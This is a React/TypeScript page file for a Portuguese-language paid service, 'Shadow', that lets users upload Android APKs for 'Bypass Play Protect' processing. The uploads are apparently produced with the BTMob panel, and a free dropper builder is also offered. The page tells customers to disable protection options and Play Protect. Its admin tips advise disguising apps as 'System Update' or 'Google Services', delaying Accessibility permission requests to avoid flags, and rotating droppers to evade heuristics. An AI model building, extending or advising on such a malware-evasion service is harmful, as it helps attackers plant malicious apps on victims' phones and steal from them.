import { createFileRoute, Link, useSearch } from "@tanstack/react-router";
import { useThemeSearchParam } from "@/hooks/use-theme-param";
import { useState, useEffect, useRef } from "react";
import { useSuspenseQuery, useQueryClient } from "@tanstack/react-query";
import { useServerFn } from "@tanstack/react-start";
import { motion, AnimatePresence } from "framer-motion";
import { ShieldCheck, Upload, Loader2, Download, AlertTriangle, CheckCircle2, RefreshCcw, Smartphone, Settings, Info, ArrowRight, ShieldAlert } from "lucide-react";
import { useI18n } from "@/lib/i18n";
import { SidebarProvider, SidebarInset } from "@/components/ui/sidebar";
import { AppSidebar } from "@/components/AppSidebar";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Progress } from "@/components/ui/progress";
import { toast } from "sonner";
import { supabase } from "@/integrations/supabase/client";
import { cancelApkJob, createApkJob, getApkResultDownload, getPlayProtectStatus, listApkJobs } from "@/lib/apk-jobs.functions";
import { getMyBuildJobs } from "@/lib/apk-builder.functions";
import { fetchMyRole, isStaffRole } from "@/lib/roles";
import { useQuery } from "@tanstack/react-query";
import { SystemHealthIndicator } from "@/components/SystemHealthIndicator";
import { triggerDownload } from "@/lib/download";
  const btmobInstructions = "/assets/shadow-play-protect-new.png?v=v147";
import { ProgressiveImage } from "@/components/ProgressiveImage";


export const Route = createFileRoute("/_authenticated/play-protect")({
  head: () => ({
    meta: [
      { title: "Bypass Play Protect — APK Builder" },
      { name: "description", content: "Envie, acompanhe e baixe seus APKs assinados pelo painel Shadow." },
      { property: "og:title", content: "Bypass Play Protect — APK Builder" },
      { property: "og:description", content: "Envie, acompanhe e baixe seus APKs assinados pelo painel Shadow." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
    ],
  }),
  loader: async ({ context }) => {
    await context.queryClient.ensureQueryData({
      queryKey: ["apk-jobs"],
      queryFn: () => listApkJobs(),
    });
  },
  component: PlayProtectPage,
});

function PlayProtectPage() {
  const { t } = useI18n();
  const search = useSearch({ from: "/_authenticated/play-protect" }) as any;
  
  useThemeSearchParam(search?.theme);

  const queryClient = useQueryClient();
  const getJobs = useServerFn(listApkJobs);
  const createJob = useServerFn(createApkJob);
  const cancelJob = useServerFn(cancelApkJob);
  const getStatus = useServerFn(getPlayProtectStatus);
  const getResult = useServerFn(getApkResultDownload);

  const [isAdmin, setIsAdmin] = useState(false);
  const [uploading, setUploading] = useState(false);
  const [selectedFile, setSelectedFile] = useState<File | null>(null);

  useEffect(() => {
    supabase.auth.getUser().then(async ({ data }) => {
      if (data.user) {
        const role = await fetchMyRole(data.user.id);
        setIsAdmin(isStaffRole(role));
      }
    });
  }, []);

  const { data: user } = useQuery({
    queryKey: ['auth-user'],
    queryFn: async () => {
      const { data } = await supabase.auth.getUser();
      return data.user;
    }
  });

  const { data: accessStatus } = useQuery({
    queryKey: ['play-protect-status', user?.id],
    enabled: !!user?.id,
    queryFn: () => getStatus(),
    retry: 2,
  });

  const isTrial = Boolean(accessStatus?.freeTrialUsed && !accessStatus?.hasActivePlan);
  const hasAccess = Boolean(accessStatus?.hasActivePlan || accessStatus?.canSubmit || isAdmin || isTrial);
  const canDownload = Boolean(accessStatus?.hasActivePlan || accessStatus?.freeTrialUsed || isAdmin);

  const { data: jobs } = useSuspenseQuery({
    queryKey: ["apk-jobs"],
    queryFn: () => getJobs(),
    refetchInterval: (query) => {
      const anyProcessing = query.state.data?.some(j => ['queued', 'claimed', 'sending', 'processing'].includes(j.status));
      return anyProcessing ? 3000 : false;
    }
  });

  // When a job reaches a terminal state, refresh the access status so
  // canDownload / hasAccess update without a manual page refresh.
  const prevStatusesRef = useRef<Record<string, string>>({});
  useEffect(() => {
    if (!jobs) return;
    const prev = prevStatusesRef.current;
    const next: Record<string, string> = {};
    let settled = false;
    for (const j of jobs as Array<{ id: string; status: string }>) {
      next[j.id] = j.status;
      const was = prev[j.id];
      if (was && was !== j.status && (j.status === "done" || j.status === "failed")) settled = true;
    }
    prevStatusesRef.current = next;
    if (settled) {
      queryClient.invalidateQueries({ queryKey: ["play-protect-status"] });
    }
  }, [jobs, queryClient]);




  const MAX_APK_MB = 50;

  const validateApk = async (file: File): Promise<string | null> => {
    if (!file.name.toLowerCase().endsWith(".apk")) return "O arquivo precisa ter extensão .apk";
    if (file.size > MAX_APK_MB * 1024 * 1024) return `APK excede ${MAX_APK_MB}MB`;
    if (file.size < 10 * 1024) return "APK muito pequeno — provavelmente corrompido";
    // Magic number check: APK is a ZIP archive → starts with PK\x03\x04
    try {
      const head = new Uint8Array(await file.slice(0, 4).arrayBuffer());
      if (!(head[0] === 0x50 && head[1] === 0x4b && (head[2] === 0x03 || head[2] === 0x05 || head[2] === 0x07))) {
        return "Arquivo não parece ser um APK válido (assinatura ZIP ausente)";
      }
    } catch {
      /* ignore, backend will re-check */
    }
    return null;
  };

  const handleBuild = async () => {
    if (!selectedFile) {
      toast.error("Selecione um APK para continuar.");
      return;
    }

    const apkError = await validateApk(selectedFile);
    if (apkError) {
      toast.error(apkError);
      return;
    }
    setUploading(true);
    let createdJobId: string | null = null;
    try {
      const reservation = await createJob({ data: { filename: selectedFile.name, sizeBytes: selectedFile.size } });
      createdJobId = reservation.jobId;
      const { error: uploadError } = await supabase.storage
        .from("apk-uploads")
        .uploadToSignedUrl(reservation.path, reservation.token, selectedFile, {
          contentType: "application/vnd.android.package-archive",
        });
      if (uploadError) throw uploadError;

      toast.success("Build iniciada com Shadow Bypass v4.6+ Polimórfico!");
      await Promise.all([
        queryClient.invalidateQueries({ queryKey: ["apk-jobs"] }),
        queryClient.invalidateQueries({ queryKey: ["play-protect-status"] }),
      ]);
      setSelectedFile(null);
    } catch (error: any) {
      if (createdJobId) await cancelJob({ data: { id: createdJobId } }).catch(() => {});
      toast.error("Erro ao iniciar build: " + (error?.message ?? "desconhecido"));
    } finally {
      setUploading(false);
    }
  };

  const downloadResult = async (id: string) => {
    try {
      const result = await getResult({ data: { id } });
      if (!result.url) throw new Error("Link de download não gerado");
      
      // Resilient trigger
      const link = document.createElement("a");
      link.href = result.url;
      link.setAttribute("download", result.filename);
      link.setAttribute("target", "_blank");
      link.setAttribute("rel", "noopener noreferrer");
      document.body.appendChild(link);
      link.click();
      setTimeout(() => document.body.removeChild(link), 200);
      
      toast.success("Download iniciado");
    } catch (error: any) {
      toast.error(error?.message ?? "Não foi possível baixar o resultado");
    }
  };


  return (
    <SidebarProvider>
      <div className="admin-enterprise flex min-h-screen w-full">
        <AppSidebar isAdmin={isAdmin} />
        <SidebarInset className="min-w-0 flex-1">
            <header className="sticky top-0 z-30 flex h-14 items-center justify-between gap-3 border-b border-border/60 bg-background/80 px-4 backdrop-blur-md">
            <div className="osint-label text-primary/80">{t("pp.title" as any)}</div>
            <SystemHealthIndicator />
          </header>


          <main className="mx-auto w-full max-w-5xl px-4 py-8 sm:px-6">
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              className="mb-8"
            >
              <h1 className="rainbow-text font-display text-3xl font-bold tracking-tight">{t("pp.header" as any)}</h1>
              <p className="mt-2 text-muted-foreground">Envie seu APK, acompanhe o processamento e baixe o arquivo assinado.</p>
              {!hasAccess && (
                <div className="mt-4 flex items-center gap-2 rounded border border-amber-500/30 bg-amber-500/10 p-3 text-xs text-amber-200/90">
                  <AlertTriangle className="h-4 w-4 text-amber-500" />
                  {accessStatus?.blockReason ?? t("pp.no_access" as any)}
                </div>
              )}
            </motion.div>

            <div className="mb-4 flex items-center gap-2">
              <span className="h-px flex-1 bg-amber-500/30" />
              <span className="font-mono text-[10px] font-bold uppercase tracking-widest text-amber-500">Método clássico (Premium) — você envia, a equipe assina · R$ 450 vitalício</span>
              <span className="h-px flex-1 bg-amber-500/30" />
            </div>

            <div className="mb-6 rounded-lg border border-amber-500/40 bg-amber-500/5 p-5">
              <div className="space-y-4">
                <div className="flex items-center gap-2">
                  <Settings className="h-5 w-5 text-amber-500" />
                  <h2 className="font-mono text-sm font-bold uppercase tracking-wider">Preparação da Build (Essencial)</h2>
                </div>
                
                <div className="grid gap-6 md:grid-cols-[1fr_300px] lg:grid-cols-[1fr_400px] items-start">
                  <div className="space-y-4">
                    <p className="text-xs text-muted-foreground">
                      Na tela de <strong>Preparar</strong> do seu painel BTMob, certifique-se de <strong>DESMARCAR</strong> as opções indicadas pelas setas na imagem ao lado:
                    </p>
                    <ul className="grid gap-2 text-xs">
                      <li className="flex items-center gap-2">
                        <span className="h-2 w-2 rounded-full bg-amber-500" />
                        <span className="font-bold text-amber-200 uppercase tracking-tighter">DEX-Protetor (DEVE FICAR DESATIVADO)</span>
                      </li>
                      <li className="flex items-center gap-2">
                        <span className="h-2 w-2 rounded-full bg-amber-500" />
                        <span className="font-bold text-amber-200 uppercase tracking-tighter">Criptografar APK (DEVE FICAR DESATIVADO)</span>
                      </li>
                    </ul>
                    
                    <div className="rounded border border-primary/30 bg-primary/5 p-3 text-xs leading-relaxed">
                      <strong className="text-primary uppercase block mb-1">Por que isso é necessário?</strong> 
                      Deixar tudo desmarcado é essencial para que nossa equipe consiga realizar o decompile, bypass e a assinatura correta. Se você enviar protegido, o bot não conseguirá processar seu APK.
                    </div>

                    <div className="rounded border border-amber-500/20 bg-amber-500/5 p-3 text-[10px] leading-tight">
                      <span className="font-bold text-amber-500 uppercase">Dica:</span> Também recomendamos desativar o Play Protect no seu dispositivo de teste (Play Store → Perfil → Play Protect → Configurações) para evitar bloqueios locais durante a instalação.
                    </div>
                  </div>

                  <a href={btmobInstructions} target="_blank" rel="noreferrer" className="block w-full aspect-video md:aspect-square lg:aspect-video overflow-hidden rounded-md border border-amber-500/40 bg-background/40">
                    <ProgressiveImage 
                      src={btmobInstructions} 
                      alt="Instruções de Build BTMob — O que desativar" 
                      className="h-full w-full object-contain md:object-cover lg:object-contain" 
                    />
                  </a>
                </div>
              </div>
            </div>



            <div className="space-y-6">

              {/* Build Section — grande zona de upload estilo clássico */}
              <div id="nova-operacao" className="osint-panel p-6 scroll-mt-24">
                <div className="mb-4 flex items-center justify-between gap-3">
                  <div>
                    <div className="font-mono text-[10px] uppercase tracking-widest text-muted-foreground">Enviar APK</div>
                    <h2 className="font-display text-2xl font-bold text-foreground">Bypass Play Protect</h2>
                  </div>
                  <span className="font-mono text-[10px] uppercase text-muted-foreground">máx {MAX_APK_MB}MB · .apk</span>
                </div>

                <input
                  type="file"
                  accept=".apk"
                  onChange={(e) => setSelectedFile(e.target.files?.[0] || null)}
                  className="hidden"
                  id="apk-upload"
                />
                <label
                  htmlFor="apk-upload"
                  onDragOver={(e) => { e.preventDefault(); }}
                  onDrop={(e) => {
                    e.preventDefault();
                    const f = e.dataTransfer.files?.[0];
                    if (f) setSelectedFile(f);
                  }}
                  className="flex min-h-[180px] cursor-pointer flex-col items-center justify-center gap-3 rounded-md border-2 border-dashed border-primary/40 bg-background/40 p-6 text-center transition-colors hover:border-primary hover:bg-primary/5"
                >
                  <div className="flex h-14 w-14 items-center justify-center rounded-full border border-primary/50 bg-primary/10">
                    <Upload className="h-6 w-6 text-primary" />
                  </div>
                  {selectedFile ? (
                    <>
                      <span className="font-display text-sm text-foreground">{selectedFile.name}</span>
                      <span className="font-mono text-[10px] uppercase text-muted-foreground">{(selectedFile.size / 1024 / 1024).toFixed(2)} MB · clique para trocar</span>
                    </>
                  ) : (
                    <>
                      <span className="text-sm">
                        <span className="font-bold text-primary">Clique para selecionar</span>
                        <span className="text-muted-foreground"> ou arraste o APK aqui</span>
                      </span>
                      <span className="font-mono text-[10px] uppercase tracking-widest text-muted-foreground/70">1 APK por vez · processado por fila</span>
                    </>
                  )}
                </label>

                <Button
                  onClick={handleBuild}
                  disabled={uploading || !selectedFile || !hasAccess}
                  className="mt-4 w-full rounded-none font-mono uppercase tracking-widest"
                >
                  {uploading ? (<><Loader2 className="mr-2 h-4 w-4 animate-spin" /> Enviando…</>) : (<><RefreshCcw className="mr-2 h-4 w-4" /> Enviar para a fila</>)}
                </Button>

                <div className="mt-4 flex gap-3 rounded bg-emerald-500/5 p-3 border border-emerald-500/20">
                  <ShieldCheck className="h-5 w-5 shrink-0 text-emerald-500" />
                  <p className="text-[11px] leading-relaxed text-emerald-200/70">
                    <strong>Shadow Bypass v4.6+:</strong> Implementamos ofuscação polimórfica que altera a assinatura digital em cada build, garantindo bypass persistente contra as novas heurísticas do Google Play Protect (Agosto/2026).
                  </p>
                </div>
              </div>

              {/* Dicas do Admin */}
              <AdminTipsSection />

              {/* Jobs Section */}
              <div className="osint-panel flex flex-col p-6">
                <div className="mb-6 flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    <Smartphone className="h-5 w-5 text-primary" />
                    <h2 className="font-mono text-sm font-bold uppercase tracking-wider text-foreground">Suas builds — Fila Play Protect</h2>
                  </div>
                  <span className="font-mono text-[10px] text-muted-foreground">{jobs?.length || 0} builds</span>
                </div>

                <div className="flex-1 space-y-3 overflow-y-auto pr-1">
                  {jobs && jobs.length > 0 ? (
                    jobs.map((job) => {
                      const statusLabel = {
                        queued: "Aguardando na fila",
                        claimed: "Admin reservou",
                        sending: "Enviando ao bot",
                        processing: "Bot assinando",
                        done: "Pronto",
                        failed: "Falhou",
                      }[job.status as string] ?? job.status;
                      return (
                      <div key={job.id} className="osint-corners border border-border/40 bg-background/40 p-3">
                        <div className="flex items-center justify-between mb-2">
                          <span className="font-display text-sm font-bold text-foreground">{job.source_filename || "APK enviado"}</span>
                          <span className={`font-mono text-[9px] uppercase tracking-tighter ${
                            job.status === 'done' ? 'text-neon' :
                            job.status === 'failed' ? 'text-danger' : 'text-amber-400'
                          }`}>
                            {statusLabel}
                          </span>
                        </div>

                        {['queued', 'claimed', 'sending', 'processing'].includes(job.status) && (
                          <div className="space-y-1.5">
                            <Progress value={job.status === 'processing' ? 70 : job.status === 'sending' ? 45 : job.status === 'claimed' ? 25 : 10} className="h-1" />
                            <div className="flex justify-between font-mono text-[8px] text-muted-foreground/60">
                              <span>{statusLabel}…</span>
                              <span>{job.status === 'processing' ? '70%' : job.status === 'sending' ? '45%' : job.status === 'claimed' ? '25%' : '10%'}</span>
                            </div>
                          </div>
                        )}

                        {job.status === 'done' && (
                          <div className="flex items-center justify-between gap-2 mt-2">
                            <div className="flex items-center gap-1.5 text-neon/80">
                              <CheckCircle2 className="h-3 w-3" />
                              <span className="font-mono text-[9px] uppercase">Pronto para download</span>
                            </div>
                            {canDownload ? (
                              <Button
                                variant="ghost"
                                size="sm"
                                className="h-7 rounded-none px-2 font-mono text-[9px] hover:text-neon"
                                 onClick={() => void downloadResult(job.id)}
                              >
                                <Download className="mr-1 h-3 w-3" /> Download
                              </Button>
                            ) : (
                              <Link to="/planos">
                                <Button
                                  variant="ghost"
                                  size="sm"
                                  className="h-7 rounded-none px-2 font-mono text-[9px] text-danger hover:bg-danger/10"
                                >
                                  Ativar Plano
                                </Button>
                              </Link>
                            )}
                          </div>
                        )}

                        {job.status === 'failed' && (
                          <div className="flex items-center gap-1.5 text-danger/80 mt-1">
                            <AlertTriangle className="h-3 w-3" />
                            <span className="font-mono text-[9px]">{job.error_message || "Erro desconhecido"}</span>
                          </div>
                        )}

                        <div className="mt-2 text-[9px] text-muted-foreground/40 font-mono">
                          ID: {job.id.slice(0, 8)} • {new Date(job.created_at).toLocaleString()}
                        </div>
                      </div>
                    );})
                  ) : (
                    <div className="flex h-40 flex-col items-center justify-center text-center">
                      <Smartphone className="mb-2 h-8 w-8 text-border/20" />
                      <p className="font-mono text-[10px] text-muted-foreground/40 uppercase">Nenhuma build registrada</p>
                    </div>
                  )}
                </div>
              </div>
            </div>

            <div className="mt-12 rounded-lg border border-violet/40 bg-violet/5 p-6">
              <div className="flex items-center gap-3 mb-4">
                <ShieldAlert className="h-6 w-6 text-violet" />
                <h2 className="text-xl font-bold font-display">Serviço gerenciado de assinatura</h2>
              </div>
              <p className="text-muted-foreground text-sm mb-6">
                Precisa de suporte para um APK complexo? O serviço gerenciado permite enviar o arquivo para análise da equipe.
              </p>
              {hasAccess ? (
                <Button
                  variant="outline"
                  className="font-mono uppercase tracking-widest border-violet/40 hover:bg-violet/10"
                  onClick={() => {
                    document.getElementById("nova-operacao")?.scrollIntoView({ behavior: "smooth", block: "start" });
                    setTimeout(() => document.getElementById("apk-upload")?.click(), 450);
                  }}
                >
                  Enviar APK para a equipe <ArrowRight className="ml-2 h-4 w-4" />
                </Button>
              ) : (
                <Link to="/planos">
                  <Button variant="outline" className="font-mono uppercase tracking-widest border-violet/40 hover:bg-violet/10">
                    Liberar acesso <ArrowRight className="ml-2 h-4 w-4" />
                  </Button>
                </Link>
              )}
            </div>

            <div className="mt-12">
              <div className="mb-4 flex items-center gap-2">
                <span className="h-px flex-1 bg-violet/30" />
                <span className="font-mono text-[10px] font-bold uppercase tracking-widest text-violet">Método público — Shadow Bypass self-service · GRÁTIS (beta)</span>
                <span className="h-px flex-1 bg-violet/30" />
              </div>
              <PublicBuilderSection />
            </div>
          </main>
        </SidebarInset>
      </div>
    </SidebarProvider>
  );
}

function PublicBuilderSection() {
  const getBuilds = useServerFn(getMyBuildJobs);
  const { data: builds, isLoading, error, refetch } = useQuery({
    queryKey: ["public-build-jobs"],
    queryFn: () => getBuilds(),
    retry: 1,
  });

  return (
    <div className="rounded-lg border border-violet/40 bg-violet/5 p-6">
      <div className="mb-4 flex items-center gap-3">
        <ShieldCheck className="h-6 w-6 text-violet" />
        <div>
          <h2 className="text-xl font-bold font-display">Shadow Bypass Builder (público)</h2>
          <p className="text-xs text-muted-foreground">Autoatendimento com dropper Shadow Bypass — grátis e em beta. Não requer plano.</p>
        </div>
      </div>
      <div className="grid gap-3 text-xs text-muted-foreground sm:grid-cols-3 mb-4">
        <div className="rounded border border-border/40 bg-background/40 p-3">
          <div className="font-mono text-[9px] uppercase tracking-widest text-violet/70 mb-1">1. Configure</div>
          Escolha nome, ícone e opções do dropper Shadow Bypass.
        </div>
        <div className="rounded border border-border/40 bg-background/40 p-3">
          <div className="font-mono text-[9px] uppercase tracking-widest text-violet/70 mb-1">2. Compile</div>
          A build acontece automaticamente sem passar pela equipe.
        </div>
        <div className="rounded border border-border/40 bg-background/40 p-3">
          <div className="font-mono text-[9px] uppercase tracking-widest text-violet/70 mb-1">3. Baixe</div>
          O APK assinado fica disponível assim que a build termina.
        </div>
      </div>
      <div className="rounded border border-border/40 bg-background/40 p-3">
        <div className="mb-2 flex items-center justify-between">
          <span className="font-mono text-[10px] uppercase tracking-widest text-muted-foreground">Suas builds públicas</span>
          <Button variant="ghost" size="sm" className="h-7 rounded-none px-2 font-mono text-[9px]" onClick={() => void refetch()}>
            <RefreshCcw className="mr-1 h-3 w-3" /> Atualizar
          </Button>
        </div>
        {isLoading ? (
          <div className="flex items-center gap-2 text-xs text-muted-foreground"><Loader2 className="h-3 w-3 animate-spin" /> Carregando…</div>
        ) : error ? (
          <div className="text-xs text-danger">Erro ao carregar builds públicas.</div>
        ) : !builds || builds.length === 0 ? (
          <div className="py-3 text-center font-mono text-[10px] uppercase text-muted-foreground/50">Nenhuma build pública ainda</div>
        ) : (
          <ul className="space-y-2">
            {builds.slice(0, 5).map((b: any) => (
              <li key={b.id} className="flex items-center justify-between border border-border/30 bg-background/30 px-2 py-1.5 text-xs">
                <span className="truncate font-display">{b.app_name || "Build"}</span>
                <span className="font-mono text-[9px] uppercase text-violet/80">{b.status}</span>
              </li>
            ))}
          </ul>
        )}
      </div>
    </div>
  );
}

function AdminTipsSection() {
  const [search, setSearch] = useState("");
  const [category, setCategory] = useState<"all" | "social" | "technical" | "naming">("all");

  const tips = [
    {
      id: "01",
      category: "social",
      title: "Ícones de Sistema",
      text: "Use ícones de aplicativos de sistema ou ferramentas nativas (Calculadora, Notas) para maior eficácia social."
    },
    {
      id: "02",
      category: "naming",
      title: "Engenharia de Nomes",
      text: "Nomes genéricos como 'System Update' ou 'Google Services' costumam ter taxa de retenção 40% maior."
    },
    {
      id: "03",
      category: "technical",
      title: "Builds Pesadas",
      text: "Para APKs acima de 50MB, certifique-se de que a conexão é estável; builds pesadas podem demorar até 8min."
    },
    {
      id: "04",
      category: "social",
      title: "Permissões Críticas",
      text: "Solicite permissões sensíveis (Acessibilidade) apenas após o primeiro boot para evitar flags imediatas."
    },
    {
      id: "05",
      category: "technical",
      title: "Variação de Dropper",
      text: "Alterne o tipo de dropper a cada 5 builds para dificultar o reconhecimento de padrão por heurísticas."
    },
    {
      id: "06",
      category: "technical",
      title: "Verificação de Assinatura",
      text: "O novo bypass é assinado automaticamente durante a compilação. Confirmamos que cada APK gerado passa pela verificação de integridade antes do download."
    },
    {
      id: "07",
      category: "technical",
      title: "Lembrete de Preços",
      text: "Lembrando que o Shadow 4.5.5 custa R$ 450, o de 30 dias custa R$ 750, o servidor custa R$ 250 somente para membros antigos (contas com histórico > 48h ou licença prévia) e o Play Protect da Shadow custa R$ 450. A verificação do Play Protect está operando com redundância tripla."
    }
  ];

  const filteredTips = tips.filter(tip => {
    const matchesSearch = tip.title.toLowerCase().includes(search.toLowerCase()) || 
                         tip.text.toLowerCase().includes(search.toLowerCase());
    const matchesCategory = category === "all" || tip.category === category;
    return matchesSearch && matchesCategory;
  });

  return (
    <div className="osint-panel p-4 border-violet/30 bg-violet/5">
      <div className="flex flex-col gap-4">
        <div className="flex items-center justify-between gap-4">
          <div className="flex items-center gap-3">
            <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-full bg-violet/20 border border-violet/40">
              <ShieldCheck className="h-4 w-4 text-violet" />
            </div>
            <h4 className="font-mono text-[10px] font-bold uppercase tracking-widest text-violet">Shadow Protocol: Dicas do Admin</h4>
          </div>
          <div className="flex gap-2">
            {(["all", "social", "technical", "naming"] as const).map(cat => (
              <button
                key={cat}
                onClick={() => setCategory(cat)}
                className={`px-2 py-0.5 font-mono text-[8px] uppercase tracking-tighter border transition-colors ${
                  category === cat 
                    ? "bg-violet/20 border-violet/50 text-violet" 
                    : "bg-background/20 border-border/40 text-muted-foreground hover:border-violet/30"
                }`}
              >
                {cat}
              </button>
            ))}
          </div>
        </div>

        <Input 
          placeholder="Filtrar diretrizes..."
          value={search}
          onChange={(e) => setSearch(e.target.value)}
          className="h-8 rounded-none border-border/40 bg-background/30 font-mono text-[10px] placeholder:text-muted-foreground/50"
        />

        <div className="grid gap-3 sm:grid-cols-3">
          <AnimatePresence mode="popLayout">
            {filteredTips.map(tip => (
              <motion.div
                key={tip.id}
                initial={{ opacity: 0, scale: 0.95 }}
                animate={{ opacity: 1, scale: 1 }}
                exit={{ opacity: 0, scale: 0.95 }}
                className="rounded border border-border/40 bg-background/40 p-2 text-[10px] leading-relaxed text-muted-foreground"
              >
                <div className="flex items-center justify-between mb-1">
                  <span className="font-bold text-foreground">// Dica #{tip.id}</span>
                  <span className="text-[8px] uppercase tracking-widest text-violet/60">{tip.category}</span>
                </div>
                <div className="mb-1 font-bold text-violet/90 text-[9px] uppercase tracking-wider">{tip.title}</div>
                {tip.text}
              </motion.div>
            ))}
          </AnimatePresence>
          {filteredTips.length === 0 && (
            <div className="sm:col-span-3 py-4 text-center font-mono text-[10px] text-muted-foreground italic">
              Nenhuma diretriz encontrada para "{search}"
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
